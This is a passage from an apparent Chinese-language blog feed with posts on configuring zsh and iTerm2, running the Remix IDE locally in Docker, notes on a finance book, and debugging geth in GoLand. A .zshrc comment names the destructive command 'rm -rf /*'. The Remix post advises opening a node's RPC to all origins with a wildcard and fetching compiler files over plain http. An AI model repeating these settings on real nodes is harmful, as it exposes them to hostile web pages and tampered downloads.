class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果提示颜色域不够，就加这句</span></span><br><span class="line"><span class="built_in">export</span> TERM=<span class="string">"xterm-256color"</span></span><br><span class="line"></span><br><span class="line">ZSH_THEME=<span class="string">"powerlevel9k/powerlevel9k"</span></span><br><span class="line">POWERLEVEL9K_MODE=<span class="string">"nerdfont-complete"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个配置主要是在bash界面显示啥，一个左边显示的条目，一个右边显示的条目</span></span><br><span class="line">POWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(ssh dir vcs status)</span><br><span class="line">POWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个主要配置需要什么插件，后面讲插件</span></span><br><span class="line">plugins=(git z zsh-syntax-highlighting zsh-autosuggestions)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装autosuggestions可能导致粘贴速度变慢，这是解决方法</span></span><br><span class="line"><span class="comment"># This speeds up pasting w/ autosuggest</span></span><br><span class="line"><span class="comment"># https://github.com/zsh-users/zsh-autosuggestions/issues/238</span></span><br><span class="line"><span class="function"><span class="title">pasteinit</span></span>() &#123;</span><br><span class="line">  OLD_SELF_INSERT=<span class="variable">$&#123;$&#123;(s.:.)widgets[self-insert]&#125;</span>[2,3]&#125;</span><br><span class="line">  <span class="built_in">zle</span> -N self-insert url-quote-magic <span class="comment"># I wonder if you'd need `.url-quote-magic`?</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">pastefinish</span></span>() &#123;</span><br><span class="line">  <span class="built_in">zle</span> -N self-insert <span class="variable">$OLD_SELF_INSERT</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">zstyle</span> :bracketed-paste-magic paste-init pasteinit</span><br><span class="line"><span class="built_in">zstyle</span> :bracketed-paste-magic paste-finish pastefinish</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用别名</span></span><br><span class="line"><span class="comment"># avoid rm -rf /*</span></span><br><span class="line">trash()</span><br><span class="line">&#123;</span><br><span class="line">    mv <span class="variable">$@</span> ~/.trash</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">alias</span> rm=<span class="string">"trash"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">alias</span> cls=<span class="string">'clear'</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">'ls -l'</span></span><br><span class="line"><span class="built_in">alias</span> la=<span class="string">'ls -a'</span></span><br></pre></td></tr></table></figure><h3 id="zsh插件"><a href="#zsh插件" class="headerlink" title="zsh插件"></a>zsh插件</h3><p>尽量不要用brew install下载，慢死了</p><h4 id="zsh-autosuggestions"><a href="#zsh-autosuggestions" class="headerlink" title="zsh-autosuggestions"></a>zsh-autosuggestions</h4><p><a href="https://www.jianshu.com/p/95f68e035f33" target="_blank" rel="noopener">参考</a></p><p>克隆仓库到本地 ~/.oh-my-zsh/custom/plugins 路径下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://github.com/zsh-users/zsh-autosuggestions <span class="variable">$ZSH_CUSTOM</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><p>用 vim 编辑 .zshrc 文件，找到插件设置命令，默认是 <code>plugins=(git)</code> ，我们把它修改为<code>plugins=(zsh-autosuggestions git)</code></p><p>PS：当你重新打开终端时可能看不到变化，可能你的字体颜色太淡了，我们把其改亮一些：</p><ol><li><code>cd ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions</code></li><li>用 vim 编辑 zsh-autosuggestions.zsh 文件，修改<code>ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE=&#39;fg=10&#39;</code></li></ol><h4 id="zsh-syntax-highlighting"><a href="#zsh-syntax-highlighting" class="headerlink" title="zsh-syntax-highlighting"></a>zsh-syntax-highlighting</h4><figure class="highlight plain"><figcaption><span>clone git://github.com/zsh-users/zsh-syntax-highlighting $ZSH_CUSTOM/plugins/zsh-syntax-highlighting```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">其余同上</span><br><span class="line"></span><br><span class="line">#### autojump</span><br><span class="line"></span><br><span class="line">这个可以自行安装，但是我觉得z就可以代替了，还省的装</span><br><span class="line"></span><br><span class="line">安装autojump：`brew install autojump`（确保有brew）</span><br><span class="line"></span><br><span class="line">.zshrc里面添加autojump：`plugins=(git autojump)`</span><br><span class="line"></span><br><span class="line">继续添加：`[[ -s $(brew --prefix)/etc/profile.d/autojump.sh ]] &amp;&amp; . $(brew --prefix)/etc/profile.d/autojump.sh`</span><br><span class="line"></span><br><span class="line">保存退出，重启终端</span><br><span class="line"></span><br><span class="line">## 可能遇到的问题</span><br><span class="line"></span><br><span class="line">### iterm修改字体仅背景生效</span><br><span class="line"></span><br><span class="line">添加如下代码</span><br><span class="line"></span><br><span class="line">```bash ~/.bash_profile</span><br><span class="line">#enables colorin the terminal bash shell export</span><br><span class="line">export CLICOLOR=1</span><br><span class="line"></span><br><span class="line">#sets up thecolor scheme for list export</span><br><span class="line">export LSCOLORS=gxfxcxdxbxegedabagacad</span><br><span class="line"></span><br><span class="line">#sets up theprompt color (currently a green similar to linux terminal)</span><br><span class="line">export PS1=&apos;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;36m\]\w\[\033[00m\]\$ &apos;</span><br><span class="line"></span><br><span class="line">#enables colorfor iTerm</span><br><span class="line">export TERM=xterm-color</span><br></pre></td></tr></table></figure><h3 id="vscode显示iterm-zsh出错"><a href="#vscode显示iterm-zsh出错" class="headerlink" title="vscode显示iterm+zsh出错"></a>vscode显示iterm+zsh出错</h3><p>这样配置后打开 VSCode 就变成这幅样子：</p><img src="https://blog-biezhi-me-1251171175.cos.ap-shanghai.myqcloud.com/public/images/2018/11/vscode_font.png" alt="vscode无法显示特殊字符" style="zoom:50%"><p>如何修复呢？只需要在 vscode 的配置文件中加入下面的配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"terminal.integrated.fontFamily"</span>: <span class="string">"Hack Nerd Font"</span>,</span><br><span class="line"><span class="string">"terminal.integrated.fontSize"</span>: 14,</span><br></pre></td></tr></table></figure><p>这样就会变成下面这个样子了。</p><img src="https://blog-biezhi-me-1251171175.cos.ap-shanghai.myqcloud.com/public/images/2018/11/vscode_new_font.png" alt="vscode正常显示" style="zoom:30%"><h3 id="iterm下的vim没有颜色"><a href="#iterm下的vim没有颜色" class="headerlink" title="iterm下的vim没有颜色"></a>iterm下的vim没有颜色</h3><figure class="highlight bash"><figcaption><span>~/.vimrc</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">syntax on</span><br><span class="line"><span class="built_in">set</span> number</span><br><span class="line"><span class="built_in">set</span> ruler</span><br></pre></td></tr></table></figure><h3 id="iTerm2-光标按照单词快速移动设置"><a href="#iTerm2-光标按照单词快速移动设置" class="headerlink" title="iTerm2 光标按照单词快速移动设置"></a>iTerm2 光标按照单词快速移动设置</h3><p>在Mac自带的终端中是可以使用 option+←和option+→ 这两个快捷键实现光标按照单词快速移动，但是iTerm用这个快捷键没有反应！！！改成下面这个『Natural Text Editing』</p><p><img src="https://i.loli.net/2019/12/08/1yUjlCWEYZikTBu.png" alt="keys调整"></p><p>bingo</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="扩展-转"><a href="#扩展-转" class="headerlink" title="扩展(转)"></a>扩展(转)</h3><p><a href="https://www.jianshu.com/p/95f68e035f33" target="_blank" rel="noopener">Mac终端配置，DIY你的Terminal （iTerm 2 + Oh My Zsh）</a></p><ol><li>iTerm2 默认使用dash改用zsh解决方法：<code>chsh -s /bin/zsh</code></li><li>iTerm2 zsh切换回原来的dash：<code>chsh -s /bin/bash</code></li><li>卸载<code>oh my zsh</code>，在命令行输入：<code>uninstall_oh_my_zsh</code></li><li>路径前缀的XX@XX太长，缩短问题：<br>编辑<code>~/.oh-my-zsh/themes/agnoster.zsh-theme</code>主体文件，将里面的<code>build_prompt</code>下的<code>prompt_context</code>字段在前面加<code>#</code>注释掉即可</li></ol><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 工具指导 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zsh </tag>
            
            <tag> iTerm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Remix本地环境搭建</title>
      <link href="/2019/11/12/remix-docker/"/>
      <url>/2019/11/12/remix-docker/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>上次被远程的坑了，太惨了。。。</p><a id="more"></a><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>选一个docker，pull，没了，2333333</p><p><code>docker pull 4c0n/remix-ide</code></p><p>比较老， 不是最新版的，下次看看最新版怎么搞</p><p><img src="https://i.loli.net/2019/12/04/GjON6kJQMC4zAHS.png" alt="老版本"></p><p>这个docker也行：<a href="https://hub.docker.com/r/mnxzyw/remix-ide-docker" target="_blank" rel="noopener">mnxzyw/remix-ide-docker</a></p><p><code>docker pull mnxzyw/remix-ide-docker</code></p><p><img src="https://i.loli.net/2019/12/04/IKemAXiFqVNagPw.png" alt="新版and修改后的本地编译器版本"></p><p>其它方法：</p><p><a href="https://www.jianshu.com/p/a4ab7aac87c3" target="_blank" rel="noopener">https://www.jianshu.com/p/a4ab7aac87c3</a></p><h2 id="编译器本地化"><a href="#编译器本地化" class="headerlink" title="编译器本地化"></a>编译器本地化</h2><p>但是你以为这就完了么，天真，这样的版本很容易碰到Complier not loaded的坑爹问题，所以还是下载本地的比较好</p><p>首先，先把js下载到本地:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ethereum/solc-bin.git</span><br></pre></td></tr></table></figure><p>但其实，下载也是超级慢，有很多非release版本，所以呢，我觉得直接用脚本下releases版本就好，文末附</p><p>然后上传到docker中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker cp path/to/solc-bin/ dockerID:/home/remix/.nvm/versions/node/v10.15.3/lib/node_modules/remix-ide/assets</span><br><span class="line">$ docker run -itd -p8080:8080 -p65520:65520 mnxzyw/remix-ide-docker:<span class="built_in">local</span></span><br></pre></td></tr></table></figure><p>最后修改 ./remix-ide/build/app.js的内容，(这里用搜索比较好)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ find / -name app.js</span><br><span class="line"><span class="comment"># /home/remix/.nvm/versions/node/v10.15.3/lib/node_modules/remix-ide/build/app.js</span></span><br><span class="line">$ <span class="built_in">cd</span> /home/remix/.nvm/versions/node/v10.15.3/lib/node_modules/remix-ide/build/</span><br><span class="line">$ cp app.js app-https.js</span><br><span class="line">$ vim app.js</span><br><span class="line"><span class="comment"># 如果没有vim，就本地下载直接修改回传吧</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2019/12/04/8P7yOKuADnMN3eT.png" alt="solc-bin下载详情" style="zoom:50%"><p>当然啦，其实不下载到本地，改成http也会快很多的</p><img src="https://i.loli.net/2019/12/04/la3Rsnv41bi5AZp.png" alt="修改成本地地址" style="zoom:50%"> <img src="https://i.loli.net/2019/12/05/Ruos5AzBgUyM7nf.png" alt="修改成http请求" style="zoom:50%"><p>其实不止这行代码，凡是https请求solc-bin.ethereum的请求我都换成本地的了,我觉得后续手动更新也比总是等远程来的方便的多Orz。</p><p>最后，可以保存这个带有本地complier js的版本为镜像<code>docker commit -a &quot;author&quot; -m &quot;message&quot; containerID mnxzyw/remix-ide-docker:local</code></p><img src="https://i.loli.net/2019/12/05/uR5EnGraZWMeVb1.png" alt="image-20191115113823951" style="zoom:50%"><h2 id="Remix的简短使用说明"><a href="#Remix的简短使用说明" class="headerlink" title="Remix的简短使用说明"></a>Remix的简短使用说明</h2><p><img src="https://i.loli.net/2019/12/05/zKbAMSWL9Pv4NVZ.png" alt="编译运行界面"></p><p><img src="https://i.loli.net/2019/12/05/hTd124xPHBczOw7.png" alt="发布调用界面"></p><p>新版本的基本也差不多，就是位置变了而已，毛太多问题啦~</p><p><img src="https://i.loli.net/2019/12/05/OcGJHS2UIoLQFRP.png" alt="新版连接本地RPC"></p><p>注意，如果连接不上，可以试试在启动节点的时候加参数<code>--rpccorsadmin &quot;*&quot;</code></p><h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>(下载solc-bin的脚本，写得比较简陋)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># getjs.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="comment"># come from http://solc-bin.ethereum.org/bin/list.json</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"0.5.13"</span>: <span class="string">"soljson-v0.5.13+commit.5b0b510c.js"</span>,</span><br><span class="line">    <span class="string">"0.5.12"</span>: <span class="string">"soljson-v0.5.12+commit.7709ece9.js"</span>,</span><br><span class="line">    <span class="string">"0.5.11"</span>: <span class="string">"soljson-v0.5.11+commit.c082d0b4.js"</span>,</span><br><span class="line">    <span class="string">"0.5.10"</span>: <span class="string">"soljson-v0.5.10+commit.5a6ea5b1.js"</span>,</span><br><span class="line">    <span class="string">"0.5.9"</span>: <span class="string">"soljson-v0.5.9+commit.e560f70d.js"</span>,</span><br><span class="line">    <span class="string">"0.5.8"</span>: <span class="string">"soljson-v0.5.8+commit.23d335f2.js"</span>,</span><br><span class="line">    <span class="string">"0.5.7"</span>: <span class="string">"soljson-v0.5.7+commit.6da8b019.js"</span>,</span><br><span class="line">    <span class="string">"0.5.6"</span>: <span class="string">"soljson-v0.5.6+commit.b259423e.js"</span>,</span><br><span class="line">    <span class="string">"0.5.5"</span>: <span class="string">"soljson-v0.5.5+commit.47a71e8f.js"</span>,</span><br><span class="line">    <span class="string">"0.5.4"</span>: <span class="string">"soljson-v0.5.4+commit.9549d8ff.js"</span>,</span><br><span class="line">    <span class="string">"0.5.3"</span>: <span class="string">"soljson-v0.5.3+commit.10d17f24.js"</span>,</span><br><span class="line">    <span class="string">"0.5.2"</span>: <span class="string">"soljson-v0.5.2+commit.1df8f40c.js"</span>,</span><br><span class="line">    <span class="string">"0.5.1"</span>: <span class="string">"soljson-v0.5.1+commit.c8a2cb62.js"</span>,</span><br><span class="line">    <span class="string">"0.5.0"</span>: <span class="string">"soljson-v0.5.0+commit.1d4f565a.js"</span>,</span><br><span class="line">    <span class="string">"0.4.26"</span>: <span class="string">"soljson-v0.4.26+commit.4563c3fc.js"</span>,</span><br><span class="line">    <span class="string">"0.4.25"</span>: <span class="string">"soljson-v0.4.25+commit.59dbf8f1.js"</span>,</span><br><span class="line">    <span class="string">"0.4.24"</span>: <span class="string">"soljson-v0.4.24+commit.e67f0147.js"</span>,</span><br><span class="line">    <span class="string">"0.4.23"</span>: <span class="string">"soljson-v0.4.23+commit.124ca40d.js"</span>,</span><br><span class="line">    <span class="string">"0.4.22"</span>: <span class="string">"soljson-v0.4.22+commit.4cb486ee.js"</span>,</span><br><span class="line">    <span class="string">"0.4.21"</span>: <span class="string">"soljson-v0.4.21+commit.dfe3193c.js"</span>,</span><br><span class="line">    <span class="string">"0.4.20"</span>: <span class="string">"soljson-v0.4.20+commit.3155dd80.js"</span>,</span><br><span class="line">    <span class="string">"0.4.19"</span>: <span class="string">"soljson-v0.4.19+commit.c4cbbb05.js"</span>,</span><br><span class="line">    <span class="string">"0.4.18"</span>: <span class="string">"soljson-v0.4.18+commit.9cf6e910.js"</span>,</span><br><span class="line">    <span class="string">"0.4.17"</span>: <span class="string">"soljson-v0.4.17+commit.bdeb9e52.js"</span>,</span><br><span class="line">    <span class="string">"0.4.16"</span>: <span class="string">"soljson-v0.4.16+commit.d7661dd9.js"</span>,</span><br><span class="line">    <span class="string">"0.4.15"</span>: <span class="string">"soljson-v0.4.15+commit.bbb8e64f.js"</span>,</span><br><span class="line">    <span class="string">"0.4.14"</span>: <span class="string">"soljson-v0.4.14+commit.c2215d46.js"</span>,</span><br><span class="line">    <span class="string">"0.4.13"</span>: <span class="string">"soljson-v0.4.13+commit.fb4cb1a.js"</span>,</span><br><span class="line">    <span class="string">"0.4.12"</span>: <span class="string">"soljson-v0.4.12+commit.194ff033.js"</span>,</span><br><span class="line">    <span class="string">"0.4.11"</span>: <span class="string">"soljson-v0.4.11+commit.68ef5810.js"</span>,</span><br><span class="line">    <span class="string">"0.4.10"</span>: <span class="string">"soljson-v0.4.10+commit.f0d539ae.js"</span>,</span><br><span class="line">    <span class="string">"0.4.9"</span>: <span class="string">"soljson-v0.4.9+commit.364da425.js"</span>,</span><br><span class="line">    <span class="string">"0.4.8"</span>: <span class="string">"soljson-v0.4.8+commit.60cc1668.js"</span>,</span><br><span class="line">    <span class="string">"0.4.7"</span>: <span class="string">"soljson-v0.4.7+commit.822622cf.js"</span>,</span><br><span class="line">    <span class="string">"0.4.6"</span>: <span class="string">"soljson-v0.4.6+commit.2dabbdf0.js"</span>,</span><br><span class="line">    <span class="string">"0.4.5"</span>: <span class="string">"soljson-v0.4.5+commit.b318366e.js"</span>,</span><br><span class="line">    <span class="string">"0.4.4"</span>: <span class="string">"soljson-v0.4.4+commit.4633f3de.js"</span>,</span><br><span class="line">    <span class="string">"0.4.3"</span>: <span class="string">"soljson-v0.4.3+commit.2353da71.js"</span>,</span><br><span class="line">    <span class="string">"0.4.2"</span>: <span class="string">"soljson-v0.4.2+commit.af6afb04.js"</span>,</span><br><span class="line">    <span class="string">"0.4.1"</span>: <span class="string">"soljson-v0.4.1+commit.4fc6fc2c.js"</span>,</span><br><span class="line">    <span class="string">"0.4.0"</span>: <span class="string">"soljson-v0.4.0+commit.acd334c9.js"</span>,</span><br><span class="line">    <span class="string">"0.3.6"</span>: <span class="string">"soljson-v0.3.6+commit.3fc68da.js"</span>,</span><br><span class="line">    <span class="string">"0.3.5"</span>: <span class="string">"soljson-v0.3.5+commit.5f97274.js"</span>,</span><br><span class="line">    <span class="string">"0.3.4"</span>: <span class="string">"soljson-v0.3.4+commit.7dab890.js"</span>,</span><br><span class="line">    <span class="string">"0.3.3"</span>: <span class="string">"soljson-v0.3.3+commit.4dc1cb1.js"</span>,</span><br><span class="line">    <span class="string">"0.3.2"</span>: <span class="string">"soljson-v0.3.2+commit.81ae2a7.js"</span>,</span><br><span class="line">    <span class="string">"0.3.1"</span>: <span class="string">"soljson-v0.3.1+commit.c492d9b.js"</span>,</span><br><span class="line">    <span class="string">"0.3.0"</span>: <span class="string">"soljson-v0.3.0+commit.11d6736.js"</span>,</span><br><span class="line">    <span class="string">"0.2.2"</span>: <span class="string">"soljson-v0.2.2+commit.ef92f56.js"</span>,</span><br><span class="line">    <span class="string">"0.2.1"</span>: <span class="string">"soljson-v0.2.1+commit.91a6b35.js"</span>,</span><br><span class="line">    <span class="string">"0.2.0"</span>: <span class="string">"soljson-v0.2.0+commit.4dc2445.js"</span>,</span><br><span class="line">    <span class="string">"0.1.7"</span>: <span class="string">"soljson-v0.1.7+commit.b4e666c.js"</span>,</span><br><span class="line">    <span class="string">"0.1.6"</span>: <span class="string">"soljson-v0.1.6+commit.d41f8b7.js"</span>,</span><br><span class="line">    <span class="string">"0.1.5"</span>: <span class="string">"soljson-v0.1.5+commit.23865e3.js"</span>,</span><br><span class="line">    <span class="string">"0.1.4"</span>: <span class="string">"soljson-v0.1.4+commit.5f6c3cd.js"</span>,</span><br><span class="line">    <span class="string">"0.1.3"</span>: <span class="string">"soljson-v0.1.3+commit.28f561.js"</span>,</span><br><span class="line">    <span class="string">"0.1.2"</span>: <span class="string">"soljson-v0.1.2+commit.d0d36e3.js"</span>,</span><br><span class="line">    <span class="string">"0.1.1"</span>: <span class="string">"soljson-v0.1.1+commit.6ff4cd6.js"</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">url0 = <span class="string">"http://solc-bin.ethereum.org/bin/"</span></span><br><span class="line"><span class="keyword">for</span> tiem <span class="keyword">in</span> data:</span><br><span class="line">    file = data[tiem]</span><br><span class="line">    url = url0 + file</span><br><span class="line">    <span class="comment">#os.path.join将多个路径组合后返回</span></span><br><span class="line">    print(<span class="string">"downloading with "</span> + url)</span><br><span class="line">    LocalPath = os.path.join(<span class="string">'./solc-bin'</span>,file)</span><br><span class="line">    urllib.request.urlretrieve(url,LocalPath)</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> remix </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《小狗钱钱》读书笔记</title>
      <link href="/2019/10/24/dog1/"/>
      <url>/2019/10/24/dog1/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>《小狗钱钱1/2》是非常不错的故事书</p><a id="more"></a><p><strong>本文特约作者：/liyinhuochong</strong></p><h2 id="《小狗钱钱1》读书笔记"><a href="#《小狗钱钱1》读书笔记" class="headerlink" title="《小狗钱钱1》读书笔记"></a>《小狗钱钱1》读书笔记</h2><h3 id="愿望是变富有的驱动力"><a href="#愿望是变富有的驱动力" class="headerlink" title="愿望是变富有的驱动力"></a>愿望是变富有的驱动力</h3><ul><li><p>想要变得富有，首先需要找到你需要变富有的原因，也就是与金钱有关的愿望</p></li><li><p>同一时期的愿望不用太多，3个足矣</p><p><em>这和另一个说法类似：列出你最想做的事10件事情，选择其中3件，并尽可能远离剩下的7件，保证能能对你想做的事情投入足够的精力，这一说法似乎源于巴菲特</em></p></li><li><p>用梦想相册来具现化你的愿望</p></li><li><p>用梦想储蓄罐来监控你的进度</p></li></ul><h3 id="变富有的方法论"><a href="#变富有的方法论" class="headerlink" title="变富有的方法论"></a>变富有的方法论</h3><ul><li><p>拥有自信，否则你很可能不会开始做任何事情</p></li><li><p>写成功日记，每天记录5条以上的成果，可以是做到的事，下定的决心，设定的目标等等任何你觉得可能是成果的东西</p></li><li><p>阅读成功日记是遇到困难时，找回自信的有效手段</p></li><li><p>不要让赚钱成为一个痛苦的过程，最好的情况是兴趣与赚钱相互融合，做喜欢的事来赚钱</p></li><li><p>重要的事情不能因为紧急的事情而放弃</p></li><li><p>遇到困难也要能够坚持自己的想法，执行自己的计划</p></li><li><p>当你决定做一件事情，你应当在72小时内开始，否则你可能永远都不会去做了</p></li></ul><h3 id="经济学相关的问题"><a href="#经济学相关的问题" class="headerlink" title="经济学相关的问题"></a>经济学相关的问题</h3><ul><li><p>最好不要使用消费贷款</p><p><em>并不是所有贷款都是不利的，但是，贷款相当于放大了收益和风险，贷款等价于使用杠杆，而杠杆应当慎用，尤其是在波动大的经济环境下</em></p></li><li><p>将收入的一部分变成“鹅”，不要杀死下金蛋的鹅</p></li><li><p>现金流是维持生存的必要条件，一旦缺乏现金流就意味着不得不产生新的债务，这也是为什么不应该尽可能多的还贷款</p></li><li><p>把钱投到安全的地方，投资应当分散</p></li><li><p>让鹅下更多的金蛋</p></li><li><p>投资应当简单明了</p></li></ul><h2 id="《小狗钱钱2》读书笔记"><a href="#《小狗钱钱2》读书笔记" class="headerlink" title="《小狗钱钱2》读书笔记"></a>《小狗钱钱2》读书笔记</h2><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用GoLand调试geth</title>
      <link href="/2019/10/15/geth-debug/"/>
      <url>/2019/10/15/geth-debug/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>geth调试遇到的问题</p><a id="more"></a><h2 id="使用goland生成geth"><a href="#使用goland生成geth" class="headerlink" title="使用goland生成geth"></a>使用goland生成geth</h2><p>选择<code>go build</code>按照包（Package）或者按照目录（Directory）的编译单位，比如编译geth就是如下目录，如果是evm就是<code>cmd/evm</code></p><p><img src="https://i.loli.net/2019/10/15/X3HOysdi9JEQopl.png" alt="goland configuration"></p><h2 id="goland调试无法输入"><a href="#goland调试无法输入" class="headerlink" title="goland调试无法输入"></a>goland调试无法输入</h2><p>直接选择debug之后，无法输入，也就是说，虽然这个console可以输入字符，但是没有反应</p><p><img src="https://i.loli.net/2019/10/15/2u6E9KYPwzAHJBS.png" alt="调试图"></p><p>这个问题idea其实也有，但是一开始没有反应过来，以为是输入卡住了，后来才反应过来原来是这个console根本没法输入。。</p><p>可以看看这个：<a href="https://github.com/go-delve/delve/issues/1274" target="_blank" rel="noopener">Unable to read stdin input in debug mode</a>，</p><blockquote><p>So far the only supported way to debug a program like this is to start a headless instance in one terminal:</p><p><code>dlv --headless debug yourprogram.go</code><br>This will print something like this:</p><p><code>API server listening at: 127.0.0.1:XYZ</code><br>then in another terminal do:</p><p><code>dlv connect :XYZ</code><br>Input for delve will go in the second terminal, input for your program will go in the first one.</p></blockquote><p>这里使用的是dlv调试，用dlv connect server就可以</p><p>我们可直接用<code>geth attach</code>来操作，该命令会启动一个连到节点的交互式JS控制台</p><p>attach的地址在启动的时候已经给出了，就是IPC地址：</p><p><img src="https://i.loli.net/2019/10/15/zh8s9l2KNWkIquL.png" alt="ipc地址"></p><p><strong>最终命令</strong>：<strong><code>geth attach xxxxx/geth.ipc</code></strong></p><p>Bingo! 开始你的调试吧！</p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 工具指导 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethereum </tag>
            
            <tag> geth </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
